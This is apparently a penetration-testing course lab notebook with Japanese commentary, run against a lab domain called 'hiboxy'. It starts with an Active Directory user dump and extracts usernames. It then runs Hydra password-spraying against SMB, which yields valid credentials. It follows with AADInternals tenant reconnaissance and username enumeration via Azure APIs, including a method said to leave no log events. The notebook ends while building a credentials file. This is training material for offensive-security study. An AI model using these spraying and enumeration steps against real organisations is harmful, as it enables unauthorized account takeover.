rroberts              rroberts@hiboxy.com             2026-03-01 00:21:21.108341  <never>             
rrobinson             rrobinson@hiboxy.com            2026-03-01 00:21:21.171179  <never>             
rrubio                rrubio@hiboxy.com               2026-03-01 00:21:21.234142  <never>             
rsalas                rsalas@hiboxy.com               2026-03-01 00:21:21.296631  <never>             
rshannon              rshannon@hiboxy.com             2026-03-01 00:21:21.359242  <never>             
rtaylor               rtaylor@hiboxy.com              2026-03-01 00:21:21.422084  <never>             
rvelasquez            rvelasquez@hiboxy.com           2026-03-01 00:21:21.500400  <never>             
rwatson               rwatson@hiboxy.com              2026-03-01 00:21:21.563350  <never>             
rwilliamson           rwilliamson@hiboxy.com          2026-03-01 00:21:21.625868  <never>             
ryu                   ryu@hiboxy.com                  2026-03-01 00:21:21.704270  <never>             
sandrade              sandrade@hiboxy.com             2026-03-01 00:21:21.767362  <never>             
sarnold               sarnold@hiboxy.com              2026-03-01 00:21:21.829709  <never>             
sbaker                sbaker@hiboxy.com               2026-03-01 00:21:21.892449  <never>             
sbarr                 sbarr@hiboxy.com                2026-03-01 00:21:21.971074  <never>             
sbates                sbates@hiboxy.com               2026-03-01 00:21:22.034151  <never>             
sbenson               sbenson@hiboxy.com              2026-03-01 00:21:22.096545  <never>             
sbishop               sbishop@hiboxy.com              2026-03-01 00:21:22.174950  2026-03-02 06:33:03.562654 
sboyd                 sboyd@hiboxy.com                2026-03-01 00:21:22.237456  <never>             
sbrown                sbrown@hiboxy.com               2026-03-01 00:21:22.300319  <never>             
sburch                sburch@hiboxy.com               2026-03-01 00:21:22.363128  <never>             
scalderon             scalderon@hiboxy.com            2026-03-01 00:21:22.425955  <never>             
schen                 schen@hiboxy.com                2026-03-01 00:21:22.488801  <never>             
sconway               sconway@hiboxy.com              2026-03-01 00:21:22.566784  <never>             
scook                 scook@hiboxy.com                2026-03-01 00:21:22.629499  <never>             
sdeleon               sdeleon@hiboxy.com              2026-03-01 00:21:22.708275  <never>             
sdrake                sdrake@hiboxy.com               2026-03-01 00:21:22.770639  <never>             
seaton                seaton@hiboxy.com               2026-03-01 00:21:22.833359  <never>             
sfreeman              sfreeman@hiboxy.com             2026-03-01 00:21:22.911940  <never>             
sgraham               sgraham@hiboxy.com              2026-03-01 00:21:22.974778  <never>             
sgraves               sgraves@hiboxy.com              2026-03-01 00:21:23.037375  <never>             
sgreen                sgreen@hiboxy.com               2026-03-01 00:21:23.115677  <never>             
sharrison             sharrison@hiboxy.com            2026-03-01 00:21:23.194751  <never>             
shawkins              shawkins@hiboxy.com             2026-03-01 00:21:23.256769  <never>             
shopkins              shopkins@hiboxy.com             2026-03-01 00:21:23.319501  <never>             
slin                  slin@hiboxy.com                 2026-03-01 00:21:23.382268  <never>             
slopez                slopez@hiboxy.com               2026-03-01 00:21:23.460758  <never>             
sluna                 sluna@hiboxy.com                2026-03-01 00:21:23.523685  <never>             
smayer                smayer@hiboxy.com               2026-03-01 00:21:23.586065  <never>             
smcknight             smcknight@hiboxy.com            2026-03-01 00:21:23.648793  <never>             
smeyers               smeyers@hiboxy.com              2026-03-01 00:21:23.727549  <never>             
smiller               smiller@hiboxy.com              2026-03-01 00:21:23.789954  <never>             
spena                 spena@hiboxy.com                2026-03-01 00:21:23.852925  <never>             
sperez                sperez@hiboxy.com               2026-03-01 00:21:23.915551  <never>             
sreyes                sreyes@hiboxy.com               2026-03-01 00:21:23.978245  <never>             
srichardson           srichardson@hiboxy.com          2026-03-01 00:21:24.040846  <never>             
ssimpson              ssimpson@hiboxy.com             2026-03-01 00:21:24.103680  <never>             
ssmith                ssmith@hiboxy.com               2026-03-01 00:21:24.197644  2026-03-03 12:59:00.192934 
ssteele               ssteele@hiboxy.com              2026-03-01 00:21:24.260377  <never>             
sthomas               sthomas@hiboxy.com              2026-03-01 00:21:24.338927  <never>             
sthompson             sthompson@hiboxy.com            2026-03-01 00:21:24.401513  <never>             
sturner               sturner@hiboxy.com              2026-03-01 00:21:24.479991  <never>             
tadams                tadams@hiboxy.com               2026-03-01 00:21:24.542902  <never>             
tandersen             tandersen@hiboxy.com            2026-03-01 00:21:24.605572  <never>             
tatkinson             tatkinson@hiboxy.com            2026-03-01 00:21:24.684047  <never>             
tbeck                 tbeck@hiboxy.com                2026-03-01 00:21:24.762429  <never>             
tcallahan             tcallahan@hiboxy.com            2026-03-01 00:21:24.825016  <never>             
tconrad               tconrad@hiboxy.com              2026-03-01 00:21:24.887614  <never>             
tcooper               tcooper@hiboxy.com              2026-03-01 00:21:24.950345  <never>             
tdavies               tdavies@hiboxy.com              2026-03-01 00:21:25.013206  <never>             
tdiaz                 tdiaz@hiboxy.com                2026-03-01 00:21:25.091873  <never>             
tdominguez            tdominguez@hiboxy.com           2026-03-01 00:21:25.154205  <never>             
tescobar              tescobar@hiboxy.com             2026-03-01 00:21:25.217209  <never>             
tflynn                tflynn@hiboxy.com               2026-03-01 00:21:25.280209  <never>             
tgolden               tgolden@hiboxy.com              2026-03-01 00:21:25.358027  <never>             
thopkins              thopkins@hiboxy.com             2026-03-01 00:21:25.420742  <never>             
thubbard              thubbard@hiboxy.com             2026-03-01 00:21:25.483483  <never>             
tjohnson              tjohnson@hiboxy.com             2026-03-01 00:21:25.546446  <never>             
tjones                tjones@hiboxy.com               2026-03-01 00:21:25.624510  <never>             
tmcdowell             tmcdowell@hiboxy.com            2026-03-01 00:21:25.686071  <never>             
tmoore                tmoore@hiboxy.com               2026-03-01 00:21:25.755183  <never>             
tmurphy               tmurphy@hiboxy.com              2026-03-01 00:21:25.812948  <never>             
tnavarro              tnavarro@hiboxy.com             2026-03-01 00:21:25.890187  <never>             
tsanders              tsanders@hiboxy.com             2026-03-01 00:21:25.952390  <never>             
tsmith                tsmith@hiboxy.com               2026-03-01 00:21:26.021164  <never>             
vberry                vberry@hiboxy.com               2026-03-01 00:21:26.082713  <never>             
vcollins              vcollins@hiboxy.com             2026-03-01 00:21:26.144210  <never>             
vgreen                vgreen@hiboxy.com               2026-03-01 00:21:26.209855  <never>             
vharrison             vharrison@hiboxy.com            2026-03-01 00:21:26.270037  <never>             
vrangel               vrangel@hiboxy.com              2026-03-01 00:21:26.325597  <never>             
vschmidt              vschmidt@hiboxy.com             2026-03-01 00:21:26.388069  <never>             
wadkins               wadkins@hiboxy.com              2026-03-01 00:21:26.466376  <never>             
wgentry               wgentry@hiboxy.com              2026-03-01 00:21:26.529065  <never>             
wharris               wharris@hiboxy.com              2026-03-01 00:21:26.591911  <never>             
wmorgan               wmorgan@hiboxy.com              2026-03-01 00:21:26.654626  <never>             
wnielsen              wnielsen@hiboxy.com             2026-03-01 00:21:26.717216  <never>             
wochoa                wochoa@hiboxy.com               2026-03-01 00:21:26.795618  <never>             
wortega               wortega@hiboxy.com              2026-03-01 00:21:26.842664  <never>             
wrobinson             wrobinson@hiboxy.com            2026-03-01 00:21:26.905390  <never>             
wstanley              wstanley@hiboxy.com             2026-03-01 00:21:26.968103  <never>             
wwade                 wwade@hiboxy.com                2026-03-01 00:21:27.031101  <never>             
wwilson               wwilson@hiboxy.com              2026-03-01 00:21:27.093538  <never>             
zclayton              zclayton@hiboxy.com             2026-03-01 00:21:27.156256  <never>             
rwilliams             rwilliams@hiboxy.com            2026-03-01 00:21:27.234824  <never>             
jdavis2               jdavis2@hiboxy.com              2026-03-01 00:21:27.297505  <never>             
jdavis1               jdavis1@hiboxy.com              2026-03-01 00:21:27.360104  <never>             
jwilliams1            jwilliams1@hiboxy.com           2026-03-01 00:21:27.438609  <never>             
rthomas               rthomas@hiboxy.com              2026-03-01 00:21:27.501690  <never>             
mlopez2               mlopez2@hiboxy.com              2026-03-01 00:21:27.564249  <never>             
wsmith                wsmith@hiboxy.com               2026-03-01 00:21:27.642325  <never>             
dmartinez             dmartinez@hiboxy.com            2026-03-01 00:21:27.705382  <never>             
pwilliams             pwilliams@hiboxy.com            2026-03-01 00:21:27.783803  <never>             
rbrown                rbrown@hiboxy.com               2026-03-01 00:21:27.846377  <never>             
jthomas               jthomas@hiboxy.com              2026-03-01 00:21:27.909099  <never>             
djohnson1             djohnson1@hiboxy.com            2026-03-01 00:21:27.971596  <never>             
srodriguez            srodriguez@hiboxy.com           2026-03-01 00:21:28.034327  <never>             
mhernandez2           mhernandez2@hiboxy.com          2026-03-01 00:21:28.097202  <never>             
rmartin4              rmartin4@hiboxy.com             2026-03-01 00:21:28.160031  <never>             
gwilliamson           gwilliamson@hiboxy.com          2026-03-01 00:21:28.238139  <never>             
mgarcia735            mgarcia735@hiboxy.com           2026-03-01 00:21:28.301160  <never>             
sthomas887            sthomas887@hiboxy.com           2026-03-01 00:21:28.363746  <never>             
jlopez967             jlopez967@hiboxy.com            2026-03-01 00:21:28.426428  <never>             
dsmith497             dsmith497@hiboxy.com            2026-03-01 00:21:28.489020  <never>             
rmartin               rmartin@hiboxy.com              2026-03-01 00:21:28.551740  <never>             
rthomas2              rthomas2@hiboxy.com             2026-03-01 00:21:28.630313  <never>             
rjohnson              rjohnson@hiboxy.com             2026-03-01 00:21:28.692846  <never>             
rrodriguez            rrodriguez@hiboxy.com           2026-03-01 00:21:28.755635  <never>             
jgonzalez             jgonzalez@hiboxy.com            2026-03-01 00:21:28.818440  <never>             
sjohnson              sjohnson@hiboxy.com             2026-03-01 00:21:28.896663  <never>             
brodriguez1           brodriguez1@hiboxy.com          2026-03-01 00:21:28.959391  <never>             
wmartin               wmartin@hiboxy.com              2026-03-01 00:21:29.022368  <never>             
mwilliams2            mwilliams2@hiboxy.com           2026-03-01 00:21:29.085013  <never>             
rmartinez             rmartinez@hiboxy.com            2026-03-01 00:21:29.147830  <never>             
$OK1000-6K9SC2L4LBBS                                  <never>              <never>             
SM_f0a35fd3e38b45b4b  SystemMailbox{1f05a927-f1ce-48b8-89b9-cf0ab76ecdd0}@hiboxy.com  <never>              <never>             
SM_61373b29032f40208  SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@hiboxy.com  <never>              <never>             
SM_1053951c40ea4fd98  SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@hiboxy.com  <never>              <never>             
SM_83540b51d42943bf8  DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@hiboxy.com  <never>              <never>             
SM_6be7dc9328364b7c9  Migration.8f3e7716-2011-43e4-96b1-aba62d229136@hiboxy.com  <never>              <never>             
SM_098c83cf3acc422a9  FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@hiboxy.com  <never>              <never>             
SM_a876ce9e91ea48f69  SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@hiboxy.com  <never>              <never>             
SM_13e36ce4036f49859  SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@hiboxy.com  <never>              <never>             
SM_3b2f22492fc34c80a  SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@hiboxy.com  <never>              <never>             
HealthMailbox3fb63be  HealthMailbox3fb63be2fc4a4a15902d418a0fbf1511@hiboxy.com  2026-03-01 01:04:26.085499  <never>             
HealthMailboxe189b0b  HealthMailboxe189b0b549a2421b925e94a36c9ff760@hiboxy.com  2026-03-01 01:04:51.272810  2026-03-06 00:24:27.364055 
HealthMailbox821cacf  HealthMailbox821cacfc3671474e99fe1bbadda6fd7d@hiboxy.com  2026-03-01 01:04:51.429435  <never>             
HealthMailbox6671682  HealthMailbox6671682ae7514ebeadd47eef3eed1800@hiboxy.com  2026-03-01 01:05:01.855191  <never>             
HealthMailbox87ba999  HealthMailbox87ba999ee9e04def8eecdb7526811694@hiboxy.com  2026-03-01 01:05:12.275137  <never>             
HealthMailboxecb37e4  HealthMailboxecb37e465e884a2f9a073d1866fcef61@hiboxy.com  2026-03-01 01:05:22.678957  <never>             
HealthMailboxee63c00  HealthMailboxee63c001cd954b9381f76007a6ad1ebb@hiboxy.com  2026-03-01 01:05:33.078882  <never>             
HealthMailbox84896e2  HealthMailbox84896e2795c9406eaf8fe2ec313b4851@hiboxy.com  2026-03-01 01:05:43.483774  <never>             
HealthMailbox515fa35  HealthMailbox515fa358b4f04543889270bd271fca57@hiboxy.com  2026-03-01 01:05:54.012685  <never>             
HealthMailboxa19fe48  HealthMailboxa19fe48a8d4b4fae89072713977027fb@hiboxy.com  2026-03-01 01:06:04.407258  <never>             
HealthMailboxfc7db9c  HealthMailboxfc7db9cdf36443a5b334138252c20bc8@hiboxy.com  2026-03-01 01:06:14.812641  <never>             
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ tail -n +6 adusers.txt | cut -d ' ' -f 1 | tee domainusers.txt
Administrator
Guest
SROCAdmin
krbtgt
SVC_SQLService
SVC_SQLService2
krosterman
smorgan
sroc.admin
tduncan
antivirus
aallen
aalvarado
abaird
abates
abecker
abrown
acarter
achavez
acoleman
acombs
adavis
adawson
afitzgerald
agarcia
agardner
ahall
ahill
aholmes
ajackson
ajimenez
ajordan
akerr
alee
alucas
amarsh
amartinez
amaxwell
amendoza
amorgan
amorris
aowen
aparker
apena
aponce
aramirez
areyes
arobertson
arowland
arussell
asanchez
aschmitt
ascott
asnyder
aspencer
athomas
athompson
atorres
awalker
awarner
bacosta
bbender
bbennett
bbrown
bbuchanan
bcarr
bellis
bferguson
bflores
bgreen
bhaynes
bhooper
bjones
bkelly
bking
bmorgan
bpage
bpatterson
bponce
brodriguez
bsanchez
bsmith
bwalker
bwatson
bwebster
bwilliams
callen
cbaldwin
cbarber
cbest
cbrown
cdavidson
cdiaz
cdurham
celliott
cgarcia
cgentry
chumphrey
cjohnson
cjones
ckelly
ckhan
ckramer
clee
clowe
cmarshall
cmccullough
cmcgrath
cmorgan
cneal
creyes
crichardson
cschwartz
cscott
csmith
csnyder
csparks
cstone
cthomas
ctownsend
cwebb
danderson
dbeasley
dbenjamin
dbryant
dbush
dcarlson
dchristensen
dcollins
dcontreras
dcortez
dcurry
dellis
dfleming
dfrench
dgibson
dgutierrez
dharrison
dhaynes
dhuang
dhudson
dhughes
djohnson
dlane
dlopez
dmacdonald
dmann
dmata
dmckenzie
dmiller
dnewman
dparker
dperez
dphillips
dpowell
dreed
dreilly
drush
drussell
dsalinas
dstokes
dtaylor
dwashington
dwilliams
dwright
ebarnes
ecochran
egay
egeorge
egould
ejenkins
ejohnson
elewis
elopez
emartin
emitchell
erobertson
eross
esalinas
eshaw
eshepherd
esmith
ewilliamson
fglenn
fhawkins
frowland
fstrong
fwalker
gcarpenter
gmason
goconnor
gthompson
handerson
hduffy
hhart
hhopkins
hjackson
hjohnson
hmarsh
hmoore
hpadilla
janderson
jarcher
jbanks
jbenson
jberg
jbrooks
jcase
jcollins
jcolon
jcooper
jcrane
jcurtis
jdavis
jelliott
jfrederick
jgarcia
jgarrett
jgibbs
jgreen
jgutierrez
jhampton
jhernandez
jingram
jjohnson
jjordan
jking
jlawson
jlee
jlopez
jmalone
jmartin
jmartinez
jmay
jmcbride
jmccormick
jmcdonald
jmercado
jmontes
jnelson
josborne
jowens
jpatterson
jperkins
jpittman
jpitts
jprice
jramirez
jreyes
jrichardson
jrivera
jrobertson
jrobinson
jrodriguez
jsanchez
jsanders
jsingleton
jsmith
jsteele
jstewart
jsullivan
jthompson
jtravis
jwalker
jwall
jwarren
jwhite
jwilliams
jwood
jwoods
jyoder
jyoung
kacevedo
kanderson
kandrews
kbradford
kcook
kcooper
kcurtis
kfrazier
kgaines
khansen
khanson
khenderson
khiggins
kjackson
kkennedy
klewis
kmccormick
kmitchell
kmoore
knelson
koliver
kpadilla
kpalmer
kperez
kponce
kpoole
kpotts
kprice
kramos
kreyes
krios
krodgers
ksandoval
kscott
kstanley
kstewart
kstone
ksutton
kswanson
kvega
kwalker
kwatkins
kwilliams
kyoung
laustin
lbarber
lbass
ldavis
ldean
lford
lgreene
lhart
lmay
lmendez
lmoore
lmorrison
lmoses
lmullen
lortiz
lreyes
lreynolds
lrosario
lsimmons
lsmith
lstout
mbaker
mbell
mcalhoun
mcarney
mcruz
mdavila
mdixon
mdodson
mdyer
mguerra
mhaas
mhernandez
mholmes
mhowell
mjohnson
mjones
mkelley
mkirby
mknight
mlara
mlee
mlopez
mluna
mmccann
mmcknight
mmiller
mmitchell
mmyers
mnguyen
mnicholson
moliver
mpetersen
mpoole
mpowers
mpreston
mramsey
mreilly
msherman
mstanton
mtaylor
mthomas
mwilliams
mwright
myoung
njones
nlopez
nramos
nramsey
nrodriguez
nsparks
ntorres
nwells
panderson
pdaniels
pdiaz
pellis
pflynn
pgarcia
pgriffith
phardy
phorne
phutchinson
pjones
pmartin
pmorgan
pnovak
pochoa
powens
proberts
psanchez
rbender
rchapman
rcook
rdaniel
rdickson
rduarte
rduran
rfreeman
rgalvan
rgomez
rgray
rhaas
rhart
rhatfield
rjones
rkirk
rlopez
rnguyen
rowen
rpaul
rpugh
rreyes
rroberts
rrobinson
rrubio
rsalas
rshannon
rtaylor
rvelasquez
rwatson
rwilliamson
ryu
sandrade
sarnold
sbaker
sbarr
sbates
sbenson
sbishop
sboyd
sbrown
sburch
scalderon
schen
sconway
scook
sdeleon
sdrake
seaton
sfreeman
sgraham
sgraves
sgreen
sharrison
shawkins
shopkins
slin
slopez
sluna
smayer
smcknight
smeyers
smiller
spena
sperez
sreyes
srichardson
ssimpson
ssmith
ssteele
sthomas
sthompson
sturner
tadams
tandersen
tatkinson
tbeck
tcallahan
tconrad
tcooper
tdavies
tdiaz
tdominguez
tescobar
tflynn
tgolden
thopkins
thubbard
tjohnson
tjones
tmcdowell
tmoore
tmurphy
tnavarro
tsanders
tsmith
vberry
vcollins
vgreen
vharrison
vrangel
vschmidt
wadkins
wgentry
wharris
wmorgan
wnielsen
wochoa
wortega
wrobinson
wstanley
wwade
wwilson
zclayton
rwilliams
jdavis2
jdavis1
jwilliams1
rthomas
mlopez2
wsmith
dmartinez
pwilliams
rbrown
jthomas
djohnson1
srodriguez
mhernandez2
rmartin4
gwilliamson
mgarcia735
sthomas887
jlopez967
dsmith497
rmartin
rthomas2
rjohnson
rrodriguez
jgonzalez
sjohnson
brodriguez1
wmartin
mwilliams2
rmartinez
$OK1000-6K9SC2L4LBBS
SM_f0a35fd3e38b45b4b
SM_61373b29032f40208
SM_1053951c40ea4fd98
SM_83540b51d42943bf8
SM_6be7dc9328364b7c9
SM_098c83cf3acc422a9
SM_a876ce9e91ea48f69
SM_13e36ce4036f49859
SM_3b2f22492fc34c80a
HealthMailbox3fb63be
HealthMailboxe189b0b
HealthMailbox821cacf
HealthMailbox6671682
HealthMailbox87ba999
HealthMailboxecb37e4
HealthMailboxee63c00
HealthMailbox84896e2
HealthMailbox515fa35
HealthMailboxa19fe48
HealthMailboxfc7db9c
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ hydra -L domainusers.txt -p Password1 -m workgroup:{hiboxy} 10.130.10.4 smb2
Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 03:36:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 572 login tries (l:572/p:1), ~36 tries per task
[DATA] attacking smb2://10.130.10.4:445/workgroup:{hiboxy}
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: bgreen   password: Password1
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: jcooper   password: Password1
[STATUS] 560.00 tries/min, 560 tries in 00:01h, 12 to do in 00:01h, 16 active
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:37:08
sec560@560vm:~/Downloads$
```

```
sec560@560vm:~/Downloads$ hydra -L domainusers.txt -P ./pass.txt -m workgroup:{hiboxy} 10.130.10.4 smb2
Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 04:23:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11440 login tries (l:572/p:20), ~715 tries per task
[DATA] attacking smb2://10.130.10.4:445/workgroup:{hiboxy}
[STATUS] 579.00 tries/min, 579 tries in 00:01h, 10861 to do in 00:19h, 16 active
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: alee   password: Winter2026
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: bsanchez   password: Winter2026!
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: bwebster   password: Winter2026
[STATUS] 581.33 tries/min, 1744 tries in 00:03h, 9696 to do in 00:17h, 16 active
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: hmarsh   password: Autumn2026
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: janderson   password: Spring2026
[STATUS] 580.43 tries/min, 4063 tries in 00:07h, 7377 to do in 00:13h, 16 active
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: jlopez   password: Autumn2026!
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: kacevedo   password: Winter2026!
[STATUS] 580.83 tries/min, 6970 tries in 00:12h, 4470 to do in 00:08h, 16 active
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: mluna   password: Autumn2026
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: nlopez   password: Spring2026
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: rduran   password: Winter2026!
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: ssmith   password: Spring2026!
[STATUS] 580.76 tries/min, 9873 tries in 00:17h, 1567 to do in 00:03h, 16 active
1 of 1 target successfully completed, 11 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 04:43:36
sec560@560vm:~/Downloads$ 
```

## Lab 2.3: Azure Recon and Password Attacks

### Windows

#### 1: Loading AADInternals

AADInternalsは、Microsoft Entra ID（旧称：Azure AD）およびMicrosoft 365の管理・セキュリティ調査・ペネトレーションテスト（侵入テスト）を行うための強力なPowerShellモジュール

- 情報の列挙（Enumeration）: テナントのID、ドメインの種類（認証済みか、フェデレーションか）、ユーザー情報などを詳細に取得できます。

- 認証のバイパス検証: 条件付きアクセスやMFA（多要素認証）の設定を確認し、設定の不備（バックドア）がないかテストできます。

- フェデレーションの操作: 自前の証明書を使ってフェデレーションサーバーを偽装し、任意のユーザーとしてトークンを発行する（Golden SAML攻撃のシミュレーションなど）高度な検証が可能です。

- Teams/Outlookの操作: Teamsでのなりすましメッセージ送信や、在席ステータスの偽装など、エンドユーザー向けの機能も含まれています。

```
Install-Module -Name AADInternals
Import-Module -Name AADInternals
```

```
PS C:\Users\sec560> Import-Module AADInternals
    ___    ___    ____  ____      __                        __
   /   |  /   |  / __ \/  _/___  / /____  _________  ____ _/ /____
  / /| | / /| | / / / // // __ \/ __/ _ \/ ___/ __ \/ __ `/ / ___/
 / ___ |/ ___ |/ /_/ _/ // / / / /_/  __/ /  / / / / /_/ / (__  )
/_/  |_/_/  |_/_____/___/_/ /_/\__/\___/_/  /_/ /_/\__,_/_/____/

 v0.9.8 by @DrAzureAD (Nestori Syynimaa)
PS C:\Users\sec560>
```

#### 2: Invoke-AADIntReconAsOutsider

、「外部の第三者（Outsider）」の視点から、対象の Microsoft 365 / Azure AD テナントの情報を調査（Reconnaissance = 偵察）するために使われます。

このコマンドの最大の特徴は、ターゲット環境のユーザー名やパスワードを一切持っていなくても実行できる点にあります。

このコマンドでわかること

ターゲットのドメイン名（例: example.com）を指定するだけで、以下のような情報を「認証なし」で一気に引き出します。

    テナントID (Tenant ID): その組織固有の GUID。

    テナント名: example.onmicrosoft.com といった初期ドメイン名。

    ドメインの種類:

        Managed: Microsoft 365 上で直接認証。

        Federated: ADFS などの外部認証サーバーを使用しているか。

    認証サーバーの URL: フェデレーション設定されている場合、どこのサーバー（ADFSなど）に認証を飛ばしているか。

    デスクトップ SSO の有無: 組織内ネットワークからのサインイン設定が有効か。

    利用可能なサービス: Exchange Online, SharePoint, Skype for Business などの導入状況。

一般的に、hiboxy.com のようなドメインには、`*.onmicrosoft.com` と `*.mail.onmicrosoft.com` も存在

```
PS C:\Users\sec560> Invoke-AADIntReconAsOutsider -DomainName hiboxy.com 2>$null | Format-Table
Tenant brand:       hiboxy
Tenant name:
Tenant id:          1c0060e4-c4db-4777-a48b-34a1515e33bf
Tenant region:      NA
DesktopSSO enabled: False
WARNING: Requests throttled!
Uses cloud sync:    True

Name        DNS    MX   SPF DMARC  DKIM MTA-STS Type    STS
----        ---    --   --- -----  ---- ------- ----    ---
hiboxy.com True False False False False   False Managed

PS C:\Users\sec560> Invoke-AADIntReconAsOutsider -DomainName hiboxy.onmicrosoft.com 2>$null| Format-Table
Tenant brand:       hiboxy
Tenant name:        hiboxy.onmicrosoft.com
Tenant id:          1c0060e4-c4db-4777-a48b-34a1515e33bf
Tenant region:      NA
DesktopSSO enabled: False

Name                    DNS   MX  SPF DMARC  DKIM MTA-STS Type    STS
----                    ---   --  --- -----  ---- ------- ----    ---
hiboxy.onmicrosoft.com True True True False False   False Managed

PS C:\Users\sec560> Invoke-AADIntReconAsOutsider -DomainName hiboxy.mail.onmicrosoft.com 2>$null| Format-Table
Tenant brand:       hiboxy
Tenant name:
Tenant id:          1c0060e4-c4db-4777-a48b-34a1515e33bf
Tenant region:      NA
DesktopSSO enabled: False
WARNING: Requests throttled!
Uses cloud sync:    True

Name                         DNS   MX  SPF DMARC  DKIM MTA-STS Type    STS
----                         ---   --  --- -----  ---- ------- ----    ---
hiboxy.mail.onmicrosoft.com True True True False False   False Managed

PS C:\Users\sec560>
```

#### 3: Invoke-AADIntUserEnumerationAsOutsider

「特定のメールアドレスがそのテナントに実在するかどうか」を外部から特定（列挙）するためのコマンド

このモジュールが攻撃対象とするAPIは3つあります：

    通常（指定なし）：GetCredentialType API
    ログイン: 標準ユーザーによるログインを試行します。試行はサインインログに記録されます。
    自動ログイン: 自動ログインAPIを使用します。このAPIはログイベントを残しません。


```
PS C:\Users\sec560> Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com"

UserName           Exists
--------           ------
aparker@hiboxy.com   True

PS C:\Users\sec560>
```

```
PS C:\Users\sec560> Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com" -Method Login

UserName           Exists
--------           ------
aparker@hiboxy.com   True

PS C:\Users\sec560>
```

#### 4: Username Harvesting Attacks

>偵察中に有効なユーザーリストやメールアドレスを発見できなかった場合、統計的に可能性の高いユーザー名プロジェクトを利用できます。Hiboxyのメールアドレス形式は`{fi}{last}@hiboxy.com`であることがわかっています。このプロジェクトを用いてユーザーを列挙する方法を以下に示します

`https://github.com/insidetrust/statistically-likely-usernames`

```
curl -O https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/refs/heads/master/jsmith.txt
gc .\jsmith.txt | % { $_ + "@hiboxy.com" } | Invoke-AADIntUserEnumerationAsOutsider | Where-Object Exists | Select-Object UserName
```

ここでは時間がかかるので簡易版を使用

```
PS C:\Users\sec560> cd C:\CourseFiles\
PS C:\CourseFiles> Get-Content users.txt
abates@hiboxy.com
alee@hiboxy.com
aparker@hiboxy.com
bgreen@hiboxy.com
bking@hiboxy.com
bsanchez@hiboxy.com
bwebster@hiboxy.com
hmarsh@hiboxy.com
janderson@hiboxy.com
jcooper@hiboxy.com
jlopez@hiboxy.com
jmartin@hiboxy.com
kacevedo@hiboxy.com
mhernandez@hiboxy.com
mlara@hiboxy.com
mluna@hiboxy.com
nlopez@hiboxy.com
rduran@hiboxy.com
rgray@hiboxy.com
slopez@hiboxy.com
ssmith@hiboxy.com
PS C:\CourseFiles>
```

```
PS C:\CourseFiles> Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider

UserName          Exists
--------          ------
abates@hiboxy.com   True
alee@hiboxy.com    False
aparker@hiboxy.c…   True
bgreen@hiboxy.com  False
bking@hiboxy.com   False
bsanchez@hiboxy.…  False
bwebster@hiboxy.…  False
hmarsh@hiboxy.com  False
janderson@hiboxy…  False
jcooper@hiboxy.c…  False
jlopez@hiboxy.com  False
jmartin@hiboxy.c…  False
kacevedo@hiboxy.…  False
mhernandez@hibox…  False
mlara@hiboxy.com    True
mluna@hiboxy.com   False
nlopez@hiboxy.com  False
rduran@hiboxy.com  False
rgray@hiboxy.com   False
slopez@hiboxy.com   True
ssmith@hiboxy.com  False

PS C:\CourseFiles>
```

```
PS C:\CourseFiles> Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider | Where-Object Exists | Select-Object UserName | tee-object hiboxy-users.txt

UserName
--------
abates@hiboxy.com
aparker@hiboxy.com
mlara@hiboxy.com
slopez@hiboxy.com

PS C:\CourseFiles>
```

### Linux

#### 5: Prepare the Attack on Linux

Windowsから作成したテキストをダウンロード

```
sec560@560vm:~/Downloads/users$ smbclient //192.168.80.128/C$ -U 'sec560%sec560' -c 'cd CourseFiles; get users.txt'
getting file \CourseFiles\users.txt of size 407 as users.txt (397.4 KiloBytes/sec) (average 397.5 KiloBytes/sec)
sec560@560vm:~/Downloads/users$ 
```

新規ユーザーを列挙した後、それらのアカウントが別の侵害事件に関与していないか、侵害データを照合すべきである。実験の都合上、4人のユーザー全員のパスワードをそれぞれ発見した。

```
sec560@560vm:~/Downloads/users$ cat << EOF > valid.creds
abates@hiboxy.com:Metallica6
